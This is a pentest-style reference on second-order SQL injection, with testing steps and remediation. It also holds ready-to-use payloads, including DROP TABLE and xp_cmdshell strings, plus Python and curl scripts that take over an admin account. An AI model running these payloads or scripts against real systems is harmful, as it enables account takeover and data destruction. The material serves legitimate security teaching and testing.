# SQL Injection Second-Order

## Overview
Second-order SQL injection (also called stored SQL injection) occurs when user-supplied data is safely stored in the database — typically because it is properly escaped or parameterized on input — but is later retrieved and used unsafely in a subsequent database query without proper handling. The vulnerability is not in the initial storage, but in how the retrieved data is subsequently used in dynamic SQL construction elsewhere in the application. This is particularly insidious because input validation at the storage layer provides a false sense of security.

## How It Works
- A user registers with a username like `admin'--`.
- The registration endpoint uses parameterized queries, so the username is stored literally as `admin'--` in the database.
- Later, a "change password" feature retrieves the stored username and constructs: `UPDATE users SET password='$new' WHERE username='admin'--'`
- The SQL comment `--` terminates the WHERE clause, making it: `UPDATE users SET password='$new' WHERE username='admin'`
- This updates the password for ALL users with username `admin`, including the real admin account.
- The attack bypasses input validation entirely because the malicious input never touches an injection point directly during initial storage.

## Impact
- Account takeover by targeting other users' stored data that flows into dynamic SQL.
- Password reset attacks where a malicious username triggers modification of another account.
- Privilege escalation by poisoning profile data that is used in admin queries.
- Persistent injection that fires every time the stored value is used in a query.
- Bypasses WAFs and input validation that only protect the initial input layer.

## Where to Look
- User registration: username, display name, email, company name fields.
- Profile update forms: bio, address, job title, phone number.
- Comment and review systems where stored content is later processed.
- Order/shipment tracking where addresses or notes are used in backend queries.
- Password reset flows that use stored email or username in a subsequent query.
- Any feature where data stored by one user is later used in a privileged query context.
- Template/report generation systems that fetch stored user-controlled strings and incorporate them in SQL.

## Testing Steps
1. Identify features that store user-controlled data (registration, profile updates, comments).
2. Register a test account with a malicious username: `test'`, `test'--`, `test' OR '1'='1`, `test\`.
3. Verify the account is created successfully (confirming proper initial parameterization or escaping).
4. Use the account normally and exercise features that might use the stored malicious data in queries.
5. Priority features: change password, update email, generate reports, admin views of user data.
6. Observe for SQL errors, unexpected behavior, or effects on other users/data.
7. On "change password" functionality, check if the new password is applied to your account OR another account (especially admin).
8. If the application uses your username in a query string you can verify: `test'-- ` as username, attempt password change.
9. Test with a SQLi payload that produces a visible error: `test' AND 1=CONVERT(int,'a')--`
10. Check all stored fields systematically — any field could be a second-order injection vector.

## Payloads / Techniques

```sql
-- Registration/profile update payloads
-- Test with these as username, display name, bio, etc.:
admin'--
admin' OR '1'='1
test\
test'/*
' OR 1=1--
admin'; DROP TABLE users--
test' UNION SELECT 1,2,3--
'; UPDATE users SET password='hacked' WHERE username='admin'--

-- Classic second-order password reset attack
-- Register with username: admin'--
-- Then use "change password" feature
-- Query becomes: UPDATE users SET password='$new' WHERE username='admin'--'
-- Effect: changes admin's password instead of yours

-- Targeted account takeover with UNION
-- Register with username: ' UNION SELECT username,password,3 FROM users--
-- If app later queries: SELECT * FROM profile WHERE username='YOUR_USERNAME'
-- It returns all users' data instead

-- Comment injection (stored in comments table, later used in report query)
-- POST /api/comment body: {"text": "Great product', (SELECT @@version))-- "}
-- Later, if report query: SELECT * FROM comments WHERE text LIKE '%'+search+'%'
-- => error-based extraction

-- MSSQL batch injection (stored as profile note)
test'; EXEC xp_cmdshell 'whoami'--
test'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;--
```

```python
import requests

BASE = "https://target.com"

# Step 1: Register with malicious username
print("[*] Step 1: Register malicious account")
r1 = requests.post(f"{BASE}/register", json={
    "username": "admin'--",
    "email": "attacker@evil.com",
    "password": "Test1234!"
})
print(f"    Registration: {r1.status_code}")

# Step 2: Login as the malicious account
print("[*] Step 2: Login")
s = requests.Session()
r2 = s.post(f"{BASE}/login", json={
    "username": "admin'--",
    "password": "Test1234!"
})
print(f"    Login: {r2.status_code}")

# Step 3: Trigger second-order — change password
print("[*] Step 3: Trigger second-order via password change")
r3 = s.post(f"{BASE}/account/change-password", json={
    "current_password": "Test1234!",
    "new_password": "Compromised1!"
})
print(f"    Password change: {r3.status_code}")

# Step 4: Try to login as real admin with new password
print("[*] Step 4: Test if admin account was affected")
r4 = requests.post(f"{BASE}/login", json={
    "username": "admin",
    "password": "Compromised1!"
})
if r4.status_code == 200:
    print("[VULNERABLE] Admin account password changed via second-order SQLi!")
else:
    print(f"    Admin login result: {r4.status_code}")
```

```python
# Systematic second-order testing across multiple stored fields
import requests

BASE = "https://target.com"
PAYLOADS = [
    "test'",
    "test'--",
    "test\\",
    "test' OR '1'='1",
    "test'; WAITFOR DELAY '0:0:3'--",  # MSSQL time-based
]

FIELDS = ["username", "firstname", "lastname", "company", "phone", "bio", "address"]

# Register accounts with each payload in each field
for field in FIELDS:
    for payload in PAYLOADS:
        r = requests.post(f"{BASE}/register", json={
            "username": f"legit_user_{hash(field+payload) % 10000}",
            "email": f"test{hash(field+payload) % 10000}@evil.com",
            "password": "Test1234!",
            field: payload  # Inject here
        })
        print(f"Field={field}, Payload={payload[:20]}: {r.status_code}")
        # After all registrations, manually trigger features and observe for errors/delays
```

```bash
# Test second-order via curl
# Step 1: Register with malicious username
curl -si -X POST https://target.com/register \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\''--","email":"attacker@evil.com","password":"Test1234!"}'

# Step 2: Login
curl -si -c cookies.txt -X POST https://target.com/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\''--","password":"Test1234!"}'

# Step 3: Change password (trigger second-order injection)
curl -si -b cookies.txt -X POST https://target.com/account/change-password \
  -H "Content-Type: application/json" \
  -d '{"current_password":"Test1234!","new_password":"Hacked123!"}'

# Step 4: Verify admin account impact
curl -si -X POST https://target.com/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"Hacked123!"}'
```

## Burp Suite Tips
- **Proxy — Track Stored Values**: When you register/update with a suspicious input, note the value. Then trace through the application to find features that retrieve and use that stored value. Use "Find in responses" to locate where your stored input reappears.
- **Repeater — Two-Step Testing**: Use two Repeater tabs — one for the storage request, one for the triggering request. Submit storage, then immediately trigger to observe second-order effects.
- **Scanner Limitations**: Burp's scanner may not detect second-order SQLi automatically because it requires a two-step correlation. Supplement with manual testing.
- **Extensions — Backslash Powered Scanner**: This Burp extension uses reflection-based detection and can sometimes identify second-order vectors by tracking stored values across requests.
- **Session Recording**: Use Burp's session recording macros to automate the two-step test: register, then trigger, comparing responses with and without the malicious payload.

## Tools
- **sqlmap** — supports second-order testing: `sqlmap -u "URL" --second-url "https://target.com/profile" -p username`
- **Burp Suite** — manual two-step detection via Proxy and Repeater.
- **OWASP ZAP** — active scanner with some stored injection detection.
- **Manual code review** — most reliable detection method; look for stored strings used in SQL concatenation.

## Remediation
- Use parameterized queries at EVERY point where data is used in SQL — not just at the input layer.
- The key insight: data that was safely stored can become an injection vector when retrieved and re-used unsafely. Apply parameterization at retrieval/use time, not just at storage time.
- Never construct SQL queries by concatenating values retrieved from the database.
- Apply output encoding/escaping when using database values in dynamic SQL contexts.
- Code review focus: search for all database reads followed by SQL string construction.
- Consider stored procedures with parameterized inputs for all common operations.
- Conduct data flow analysis: trace every user-controlled field from input through storage to all subsequent uses.

## References
https://owasp.org/www-community/attacks/SQL_Injection
https://portswigger.net/web-security/sql-injection#second-order-sql-injection
https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
https://cwe.mitre.org/data/definitions/89.html
https://www.acunetix.com/websitesecurity/sql-injection2/
